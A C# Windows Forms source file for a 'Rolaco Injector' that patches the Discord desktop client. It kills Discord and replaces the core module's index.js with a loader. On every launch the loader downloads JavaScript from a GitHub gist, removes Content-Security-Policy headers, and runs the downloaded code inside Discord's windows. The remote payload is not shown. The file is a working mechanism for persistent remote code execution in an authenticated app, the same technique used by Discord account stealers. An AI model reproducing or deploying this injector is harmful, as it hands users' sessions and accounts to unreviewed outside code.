using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DiscordInjector
{
    public partial class Form1 : Form
    {
        private readonly string[] DiscordFolders = new[]
        {
            "Discord",
            "DiscordPTB",
            "DiscordCanary"
        };

        private readonly string[] DiscordTypes = new[]
        {
            "Discord",
            "Discord PTB",
            "Discord Canary"
        };

        private readonly string[] DiscordProcessNames = new[]
        {
            "Discord",
            "DiscordPTB",
            "DiscordCanary"
        };

        private readonly string[] DiscordExecutables = new[]
        {
            "Discord.exe",
            "DiscordPTB.exe",
            "DiscordCanary.exe"
        };

        private bool isDragging = false;
        private Point lastCursor;
        private Point lastForm;
        private Timer discordCheckTimer;

        public Form1()
        {
            InitializeComponent();

            // ربط الأحداث هنا في الكود الرئيسي
            this.titleBar.MouseDown += TitleBar_MouseDown;
            this.titleBar.MouseMove += TitleBar_MouseMove;
            this.titleBar.MouseUp += TitleBar_MouseUp;
            this.minimizeButton.Click += MinimizeButton_Click;
            this.closeButton.Click += CloseButton_Click;
            this.injectButton.Click += InjectButton_Click;
            this.removeButton.Click += RemoveButton_Click;
            this.scanButton.Click += ScanButton_Click;
            this.discordTypeCombo.DrawItem += ComboBox_DrawItem;
            this.discordTypeCombo.SelectedIndexChanged += DiscordTypeCombo_SelectedIndexChanged;
            this.Paint += Form1_Paint;
            this.mainPanel.Paint += MainPanel_Paint;
            this.Resize += Form_Resize;

            // إعداد أيقونة العلبة وفحص العمليات
            SetupTrayIcon();
            CheckForDiscordProcesses();
        }

        private void DiscordTypeCombo_SelectedIndexChanged(object sender, EventArgs e)
        {
            CheckForDiscordProcesses();
        }

        private void SetupTrayIcon()
        {
            trayMenu = new ContextMenuStrip();
            trayMenu.Items.Add("Show", null, (s, e) => { this.Show(); this.WindowState = FormWindowState.Normal; });
            trayMenu.Items.Add("Exit", null, (s, e) => Application.Exit());

            trayIcon = new NotifyIcon
            {
                Icon = SystemIcons.Application,
                ContextMenuStrip = trayMenu,
                Text = "Rolaco Injector",
                Visible = true
            };
            trayIcon.DoubleClick += (s, e) => { this.Show(); this.WindowState = FormWindowState.Normal; };
        }

        private void CheckForDiscordProcesses()
        {
            if (discordCheckTimer != null)
            {
                discordCheckTimer.Stop();
                discordCheckTimer.Dispose();
            }

            discordCheckTimer = new Timer { Interval = 2000 };
            discordCheckTimer.Tick += (s, e) =>
            {
                try
                {
                    if (statusLabel == null || discordTypeCombo == null) return;

                    int discordType = discordTypeCombo.SelectedIndex;
                    if (discordType < 0 || discordType >= DiscordProcessNames.Length)
                    {
                        discordType = 0;
                    }

                    string processName = DiscordProcessNames[discordType];
                    string discordName = DiscordTypes[discordType];

                    var processes = Process.GetProcessesByName(processName);

                    if (processes.Length > 0)
                    {
                        statusLabel.Text = $"● {discordName} is running";
                        statusLabel.ForeColor = Color.FromArgb(255, 100, 100);
                    }
                    else
                    {
                        statusLabel.Text = "● Ready to inject";
                        statusLabel.ForeColor = Color.FromArgb(0, 200, 150);
                    }
                }
                catch
                {
                    if (statusLabel != null)
                    {
                        statusLabel.Text = "● Ready to inject";
                        statusLabel.ForeColor = Color.FromArgb(0, 200, 150);
                    }
                }
            };
            discordCheckTimer.Start();
        }

        private async void InjectButton_Click(object sender, EventArgs e)
        {
            try
            {
                injectButton.Enabled = false;
                progressBar.Visible = true;

                int discordType = discordTypeCombo?.SelectedIndex ?? 0;
                if (discordType < 0 || discordType >= DiscordProcessNames.Length)
                {
                    discordType = 0;
                }

                string processName = DiscordProcessNames[discordType];
                string discordName = DiscordTypes[discordType];
                string executableName = DiscordExecutables[discordType];

                statusLabel.Text = $"Injecting into {discordName}...";
                statusLabel.ForeColor = Color.FromArgb(0, 200, 150);

                var discordProcesses = Process.GetProcessesByName(processName);
                bool wasRunning = discordProcesses.Length > 0;

                if (discordProcesses.Length > 0)
                {
                    statusLabel.Text = $"Closing {discordName}...";
                    foreach (var process in discordProcesses)
                    {
                        process.Kill();
                        await Task.Delay(500);
                    }
                    await Task.Delay(1000);
                }

                await ModifyIndexFile(discordType);

                statusLabel.Text = $"Successfully injected into {discordName}!";
                statusLabel.ForeColor = Color.FromArgb(0, 200, 150);

                if (wasRunning)
                {
                    statusLabel.Text = $"Restarting {discordName}...";
                    await RestartDiscord(discordType, executableName);
                }

                MessageBox.Show(
                    $"Injection completed successfully for {discordName}!\n\n" +
                    $"Press INS key in {discordName} to show/hide the interface.\n" +
                    $"{(wasRunning ? "Discord has been restarted automatically." : "Please start Discord manually.")}",
                    "Success",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error: {ex.Message}", "Error",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                statusLabel.Text = "Injection failed";
                statusLabel.ForeColor = Color.FromArgb(220, 70, 70);
            }
            finally
            {
                injectButton.Enabled = true;
                progressBar.Visible = false;
            }
        }

        private async Task RestartDiscord(int discordType, string executableName)
        {
            try
            {
                string discordFolder = GetDiscordFolder(discordType);
                var appData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                var discordBase = Path.Combine(appData, discordFolder);

                if (!Directory.Exists(discordBase))
                {
                    return;
                }

                var versions = Directory.GetDirectories(discordBase, "app-*");
                if (versions.Length == 0) return;

                var latestVersion = versions.OrderByDescending(Path.GetFileName).First();
                var executablePath = Path.Combine(latestVersion, executableName);

                if (File.Exists(executablePath))
                {
                    Process.Start(executablePath);
                    await Task.Delay(2000);
                }
            }
            catch
            {
            }
        }

        private string GetDiscordFolder(int discordType)
        {
            if (discordType < 0 || discordType >= DiscordFolders.Length)
                return "Discord";

            return discordType switch
            {
                0 => "Discord",
                1 => "DiscordPTB",
                2 => "DiscordCanary",
                _ => "Discord"
            };
        }

        private async Task ModifyIndexFile(int discordType)
        {
            var appData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            string discordFolder = GetDiscordFolder(discordType);
            var discordBase = Path.Combine(appData, discordFolder);

            if (!Directory.Exists(discordBase))
            {
                throw new Exception($"{discordFolder} installation not found");
            }

            var versions = Directory.GetDirectories(discordBase, "app-*");
            if (versions.Length == 0) throw new Exception($"No {discordFolder} version found");

            var latestVersion = versions.OrderByDescending(Path.GetFileName).First();
            var modulesPath = Path.Combine(latestVersion, "modules");

            if (!Directory.Exists(modulesPath))
            {
                throw new Exception($"Modules folder not found");
            }

            string targetPath = null;

            var coreFolders = Directory.GetDirectories(modulesPath, "discord_desktop_core*");

            foreach (var coreFolder in coreFolders)
            {
                if (File.Exists(Path.Combine(coreFolder, "index.js")) ||
                    File.Exists(Path.Combine(coreFolder, "core.asar")))
                {
                    targetPath = coreFolder;
                    break;
                }

                var subFolders = Directory.GetDirectories(coreFolder, "discord_desktop_core*");
                if (subFolders.Length > 0)
                {
                    foreach (var subFolder in subFolders)
                    {
                        if (File.Exists(Path.Combine(subFolder, "index.js")) ||
                            File.Exists(Path.Combine(subFolder, "core.asar")))
                        {
                            targetPath = subFolder;
                            break;
                        }
                    }
                }

                if (targetPath != null) break;
            }

            if (targetPath == null)
            {
                var possiblePaths = new[]
                {
                    Path.Combine(modulesPath, "discord_desktop_core-1", "discord_desktop_core"),
                    Path.Combine(modulesPath, "discord_desktop_core-2", "discord_desktop_core"),
                    Path.Combine(modulesPath, "discord_desktop_core-3", "discord_desktop_core"),
                    Path.Combine(modulesPath, "discord_desktop_core", "discord_desktop_core"),
                    Path.Combine(modulesPath, "discord_desktop_core-1"),
                    Path.Combine(modulesPath, "discord_desktop_core-2"),
                    Path.Combine(modulesPath, "discord_desktop_core-3"),
                    Path.Combine(modulesPath, "discord_desktop_core")
                };

                foreach (var path in possiblePaths)
                {
                    if (Directory.Exists(path) &&
                        (File.Exists(Path.Combine(path, "index.js")) ||
                         File.Exists(Path.Combine(path, "core.asar"))))
                    {
                        targetPath = path;
                        break;
                    }
                }
            }

            if (targetPath == null)
                throw new Exception($"Could not find discord_desktop_core folder");

            var indexPath = Path.Combine(targetPath, "index.js");
            var rolacoPath = Path.Combine(targetPath, "rolaco.js");

            if (!File.Exists(indexPath))
            {
                await File.WriteAllTextAsync(indexPath, "module.exports = require('./core.asar');", Encoding.UTF8);
            }

            var backupIndexPath = indexPath + ".backup";
            if (File.Exists(indexPath) && !File.Exists(backupIndexPath))
            {
                var currentContent = await File.ReadAllTextAsync(indexPath);
                if (!currentContent.Contains("Rolaco") || currentContent.Length < 500)
                {
                    File.Copy(indexPath, backupIndexPath, true);
                }
            }

            var fullCode = GetFullInjectorCode();
            await File.WriteAllTextAsync(indexPath, fullCode, Encoding.UTF8);

            statusLabel.Text = "Downloading Rolaco code from server...";

            using (var client = new HttpClient())
            {
                client.Timeout = TimeSpan.FromSeconds(30);
                var rolacoCode = await client.GetStringAsync("https://gist.githubusercontent.com/Rolaco0/a131d6aeb8ffdddfe92624988b9c93ef/raw/f67012daa26ade3d6041b6f8dbb13e226254c0ec/Quest.txt");

                if (string.IsNullOrWhiteSpace(rolacoCode))
                {
                    throw new Exception("Downloaded code is empty");
                }

                await File.WriteAllTextAsync(rolacoPath, rolacoCode, Encoding.UTF8);
            }

            statusLabel.Text = "Download complete!";
        }

        private string GetFullInjectorCode()
        {
            return @"const originalDiscord = require('./core.asar');

(function() {
    if (typeof process === 'undefined' || !process.versions || !process.versions.electron) {
        return;
    }

    console.log('Loading Rolaco from URL...');

    const { app, BrowserWindow } = require('electron');
    const https = require('https');
    const fs = require('fs');
    const path = require('path');

    const saveCodeLocally = (code) => {
        try {
            const filePath = path.join(__dirname, 'rolaco.js');
            fs.writeFileSync(filePath, code);
            console.log('Code saved locally');
            return true;
        } catch (e) {
            return false;
        }
    };

    const fetchCodeFromUrl = async () => {
        return new Promise((resolve, reject) => {
            const url = 'https://gist.githubusercontent.com/Rolaco0/a131d6aeb8ffdddfe92624988b9c93ef/raw/f67012daa26ade3d6041b6f8dbb13e226254c0ec/Quest.txt';
            https.get(url, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => resolve(data));
            }).on('error', reject);
        });
    };

    const disableCSP = (win) => {
        try {
            if (!win || win.isDestroyed()) return;
            
            win.webContents.session.webRequest.onHeadersReceived((details, callback) => {
                callback({
                    responseHeaders: {
                        ...details.responseHeaders,
                        'Content-Security-Policy': [],
                        'Content-Security-Policy-Report-Only': []
                    }
                });
            });
        } catch (e) {}
    };

    const injectRolaco = (win) => {
        try {
            if (!win || win.isDestroyed()) return;
            
            const filePath = path.join(__dirname, 'rolaco.js');
            if (!fs.existsSync(filePath)) return;
            
            const code = fs.readFileSync(filePath, 'utf8');
            
            const finalCode = code + `
                (function() {
                    if (window.__rolacoFinal) return;
                    window.__rolacoFinal = true;
                    
                    const gui = document.getElementById('rolaco-completer-gui');
                    if (gui) gui.style.display = 'none';
                    
                    let insPressed = false;
                    document.addEventListener('keydown', function(e) {
                        if (e.key === 'Insert' || e.keyCode === 45) {
                            e.preventDefault();
                            if (insPressed) return;
                            insPressed = true;
                            
                            const gui = document.getElementById('rolaco-completer-gui');
                            if (gui) {
                                if (gui.style.display === 'none') {
                                    gui.style.display = 'block';
                                } else {
                                    gui.style.display = 'none';
                                }
                            }
                            
                            setTimeout(() => { insPressed = false; }, 300);
                        }
                    });
                    
                    const closeBtn = document.getElementById('guiClose');
                    if (closeBtn) {
                        closeBtn.onclick = function() {
                            const gui = document.getElementById('rolaco-completer-gui');
                            if (gui) gui.remove();
                        };
                    }
                })();
            `;
            
            win.webContents.executeJavaScript(finalCode).catch(() => {});
            
        } catch (e) {}
    };

    app.whenReady().then(async () => {
        try {
            console.log('Downloading code...');
            const rolacoCode = await fetchCodeFromUrl();
            saveCodeLocally(rolacoCode);
            console.log('Code ready');

            app.on('browser-window-created', (e, win) => {
                disableCSP(win);
                setTimeout(() => injectRolaco(win), 3000);
            });

            setTimeout(() => {
                BrowserWindow.getAllWindows().forEach(win => {
                    disableCSP(win);
                    setTimeout(() => injectRolaco(win), 2000);
                });
            }, 3000);

        } catch (error) {
            console.error('Failed:', error.message);
        }
    });
})();

module.exports = originalDiscord;";
        }

        private async void RemoveButton_Click(object sender, EventArgs e)
        {
            try
            {
                removeButton.Enabled = false;
                progressBar.Visible = true;

                int discordType = discordTypeCombo?.SelectedIndex ?? 0;
                if (discordType < 0 || discordType >= DiscordProcessNames.Length)
                {
                    discordType = 0;
                }

                string processName = DiscordProcessNames[discordType];
                string discordName = DiscordTypes[discordType];
                string executableName = DiscordExecutables[discordType];

                statusLabel.Text = $"Removing injection from {discordName}...";
                statusLabel.ForeColor = Color.FromArgb(220, 70, 70);

                var discordProcesses = Process.GetProcessesByName(processName);
                bool wasRunning = discordProcesses.Length > 0;

                if (discordProcesses.Length > 0)
                {
                    statusLabel.Text = $"Closing {discordName}...";
                    foreach (var process in discordProcesses)
                    {
                        process.Kill();
                        await Task.Delay(500);
                    }
                    await Task.Delay(1000);
                }

                var appData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                var removed = false;

                string discordFolder = GetDiscordFolder(discordType);
                var basePath = Path.Combine(appData, discordFolder);

                if (Directory.Exists(basePath))
                {
                    var versions = Directory.GetDirectories(basePath, "app-*");
                    foreach (var version in versions)
                    {
                        var modulesPath = Path.Combine(version, "modules");

                        var possibleTargetPaths = new[]
                        {
                            Path.Combine(modulesPath, "discord_desktop_core-1", "discord_desktop_core"),
                            Path.Combine(modulesPath, "discord_desktop_core-2", "discord_desktop_core"),
                            Path.Combine(modulesPath, "discord_desktop_core-3", "discord_desktop_core"),
                            Path.Combine(modulesPath, "discord_desktop_core", "discord_desktop_core"),
                            Path.Combine(modulesPath, "discord_desktop_core-1"),
                            Path.Combine(modulesPath, "discord_desktop_core-2"),
                            Path.Combine(modulesPath, "discord_desktop_core-3"),
                            Path.Combine(modulesPath, "discord_desktop_core")
                        };

                        foreach (var targetPath in possibleTargetPaths)
                        {
                            if (Directory.Exists(targetPath))
                            {
                                var indexPath = Path.Combine(targetPath, "index.js");
                                var rolacoPath = Path.Combine(targetPath, "rolaco.js");
                                var backupIndexPath = indexPath + ".backup";

                                if (File.Exists(backupIndexPath))
                                {
                                    File.Copy(backupIndexPath, indexPath, true);
                                    File.Delete(backupIndexPath);
                                    removed = true;
                                }
                                else if (File.Exists(indexPath))
                                {
                                    var originalCode = "module.exports = require('./core.asar');";
                                    await File.WriteAllTextAsync(indexPath, originalCode, Encoding.UTF8);
                                    removed = true;
                                }

                                if (File.Exists(rolacoPath))
                                {
                                    File.Delete(rolacoPath);
                                }
                            }
                        }
                    }
                }

                if (removed)
                {
                    statusLabel.Text = $"Injection removed from {discordName}!";
                    statusLabel.ForeColor = Color.FromArgb(0, 200, 150);

                    if (wasRunning)
                    {
                        statusLabel.Text = $"Restarting {discordName}...";
                        await RestartDiscord(discordType, executableName);
                    }

                    MessageBox.Show(
                        $"Injection has been removed from {discordName}!\n\n" +
                        $"Original index.js has been restored and rolaco.js deleted.\n" +
                        $"{(wasRunning ? "Discord has been restarted automatically." : "Please start Discord manually.")}",
                        "Success",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Information);
                }
                else
                {
                    statusLabel.Text = "No injection found";
                    statusLabel.ForeColor = Color.FromArgb(220, 170, 0);

                    if (wasRunning)
                    {
                        statusLabel.Text = $"Restarting {discordName}...";
                        await RestartDiscord(discordType, executableName);
                    }
                }

                await Task.Delay(2000);
                statusLabel.Text = "Ready";
                statusLabel.ForeColor = Color.FromArgb(150, 150, 150);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error: {ex.Message}", "Error",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                statusLabel.Text = "Removal failed";
                statusLabel.ForeColor = Color.FromArgb(220, 70, 70);
            }
            finally
            {
                removeButton.Enabled = true;
                progressBar.Visible = false;
            }
        }

        private async void ScanButton_Click(object sender, EventArgs e)
        {
            try
            {
                statusLabel.Text = "Scanning Discord installations...";
                statusLabel.ForeColor = Color.FromArgb(70, 70, 220);

                var appData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                var found = false;

                for (int i = 0; i < DiscordFolders.Length; i++)
                {
                    var basePath = Path.Combine(appData, DiscordFolders[i]);
                    if (Directory.Exists(basePath))
                    {
                        var versions = Directory.GetDirectories(basePath, "app-*");
                        if (versions.Length > 0)
                        {
                            found = true;
                            var latestVersion = versions.OrderByDescending(Path.GetFileName).First();
                            var modulesPath = Path.Combine(latestVersion, "modules");

                            var possibleTargetPaths = new[]
                            {
                                Path.Combine(modulesPath, "discord_desktop_core-1", "discord_desktop_core"),
                                Path.Combine(modulesPath, "discord_desktop_core-2", "discord_desktop_core"),
                                Path.Combine(modulesPath, "discord_desktop_core-3", "discord_desktop_core"),
                                Path.Combine(modulesPath, "discord_desktop_core", "discord_desktop_core"),
                                Path.Combine(modulesPath, "discord_desktop_core-1"),
                                Path.Combine(modulesPath, "discord_desktop_core-2"),
                                Path.Combine(modulesPath, "discord_desktop_core-3"),
                                Path.Combine(modulesPath, "discord_desktop_core")
                            };

                            foreach (var targetPath in possibleTargetPaths)
                            {
                                if (Directory.Exists(targetPath))
                                {
                                    var indexPath = Path.Combine(targetPath, "index.js");
                                    if (File.Exists(indexPath))
                                    {
                                        var content = await File.ReadAllTextAsync(indexPath);
                                        if (content.Contains("Rolaco") && content.Length > 500)
                                        {
                                            statusLabel.Text = $"{DiscordTypes[i]} is injected";
                                            statusLabel.ForeColor = Color.FromArgb(0, 200, 150);
                                            return;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }

                if (found)
                {
                    statusLabel.Text = "No injection found";
                    statusLabel.ForeColor = Color.FromArgb(220, 70, 70);
                }
                else
                {
                    statusLabel.Text = "No Discord installation found";
                    statusLabel.ForeColor = Color.FromArgb(220, 170, 0);
                }
            }
            catch
            {
                statusLabel.Text = "Scan failed";
                statusLabel.ForeColor = Color.FromArgb(220, 70, 70);
            }
        }

        private void TitleBar_MouseDown(object sender, MouseEventArgs e)
        {
            isDragging = true;
            lastCursor = Cursor.Position;
            lastForm = this.Location;
        }

        private void TitleBar_MouseMove(object sender, MouseEventArgs e)
        {
            if (isDragging)
            {
                var deltaX = Cursor.Position.X - lastCursor.X;
                var deltaY = Cursor.Position.Y - lastCursor.Y;
                this.Location = new Point(lastForm.X + deltaX, lastForm.Y + deltaY);
            }
        }

        private void TitleBar_MouseUp(object sender, MouseEventArgs e)
        {
            isDragging = false;
        }

        private void MinimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void CloseButton_Click(object sender, EventArgs e)
        {
            discordCheckTimer?.Stop();
            discordCheckTimer?.Dispose();
            trayIcon?.Dispose();
            Application.Exit();
        }

        private void Form_Resize(object sender, EventArgs e)
        {
            if (minimizeButton != null && closeButton != null)
            {
                minimizeButton.Location = new Point(this.Width - 95, 12);
                closeButton.Location = new Point(this.Width - 50, 12);
            }
        }

        private void Form1_Paint(object sender, PaintEventArgs e)
        {
            using (var pen = new Pen(Color.FromArgb(0, 200, 150), 2))
            {
                var rect = new Rectangle(1, 1, this.Width - 3, this.Height - 3);
                e.Graphics.DrawRectangle(pen, rect);
            }
        }

        private void MainPanel_Paint(object sender, PaintEventArgs e)
        {
            using (var brush = new LinearGradientBrush(
                this.ClientRectangle,
                Color.FromArgb(25, 25, 35),
                Color.FromArgb(15, 15, 20),
                LinearGradientMode.Vertical))
            {
                e.Graphics.FillRectangle(brush, this.ClientRectangle);
            }
        }

        private void ComboBox_DrawItem(object sender, DrawItemEventArgs e)
        {
            if (e.Index < 0 || discordTypeCombo == null) return;

            e.DrawBackground();
            using (var brush = new SolidBrush((e.State & DrawItemState.Selected) == DrawItemState.Selected
                ? Color.FromArgb(0, 200, 150) : Color.FromArgb(35, 35, 45)))
            {
                e.Graphics.FillRectangle(brush, e.Bounds);
            }
            TextRenderer.DrawText(e.Graphics, discordTypeCombo.Items[e.Index].ToString(),
                e.Font, e.Bounds, Color.White, TextFormatFlags.VerticalCenter | TextFormatFlags.Left);
            e.DrawFocusRectangle();
        }
    }
}
